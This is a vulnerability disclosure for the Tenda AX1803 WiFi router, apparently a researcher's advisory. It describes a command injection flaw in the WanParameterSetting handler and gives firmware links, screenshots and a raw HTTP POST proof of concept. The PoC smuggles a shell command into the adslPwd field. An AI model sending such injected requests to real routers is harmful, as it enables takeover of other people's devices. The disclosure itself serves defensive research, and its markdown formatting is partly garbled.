

\#***\* Tenda ax1803 has a command injection vulnerability\****

\##* * * \ * overview\****

• ****\* type \ ****: command injection vulnerability

• * * * \ * supplier \ * * * *: Tenda（ https://tenda.com.cn ）

• ****\* product ****: WiFi router ax1803

• ***\* firmware download address:\**** https://www.tenda.com.cn/download/detail-3225.html

• ***\* firmware download address:\**** https://down.tenda.com.cn/uploadfile/AX1803/US_AX1803v2.1br_v1.0.0.1_2890_CN_ZGYD01.zip

Tendaax1803 router adopts WiFi 6 (802.11ax) technology, and the dual band concurrency rate is up to 1775mbps (2.4ghz:574mbps, 5ghz:1201mbps). Compared with the ac1200 router of the previous generation WiFi 5 standard, the wireless rate is increased by 50% and the transmission distance is longer; Equipped with 1.5GHz high-performance quad core processor, the network load capacity is comprehensively improved, data forwarding is faster, and long-term operation is more stable; Using ofdma+mu-mimo technology, more devices can access the Internet at the same time, the transmission efficiency is significantly improved, the delay is significantly reduced, and the online games and ultra clear videos for multiple people are more fluent. It is the first choice for building a multimedia home network! Command Execution Vulnerability in wanparametersetting



## ***\*Description\****

### ****1, Product Information:\****

Overview of the latest version of simulation for Tenda AX1803 router:

![image-20220624183557535](img/image-20220624183557535.png)

 

 

 

### ****2. Vulnerability Details\****

Tenda AX1803 was found to have a command injection vulnerability in the WanParameterSetting function

![image-20220624133917486](img/image-20220624133917486.png)

![image-20220625112118028](img/image-20220625112118028.png)

The non-zero is true, and when we change the adslPwd parameter, we get a command injection vulnerability after setting it.

![img](img/aaa.png)

 



\## ***\*3. Recurring loopholes and POC\****

To reproduce the vulnerability, the following steps can be followed:

Start firmware (real machine) via qemu-system or other means

Attack using the following POC attacks

Note the replacement of password fields in cookies

```
POST /goform/WanParameterSetting?0.8762489734485668 HTTP/1.1
Host: i92.168.68.150
Connection: close
Content-Length: 191
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36
sec-ch-ua-platform: "macOS"
Origin: https://i92.168.68.150
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://192.168.2.1/main.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: password=edeff4d6d98974e46457a587e2e724a2ndy5gk

wanType=2&adslUser=aaaa&adslPwd=$(ls > /tmp/xxx)&vpnServer=&vpnUser=&vpnPwd=&vpnWanType=l&dnsAuto=1&staticIp=&mask=&gateway=&dnsl=&dns2=&module=wanl&downSpeedLimit=
```

 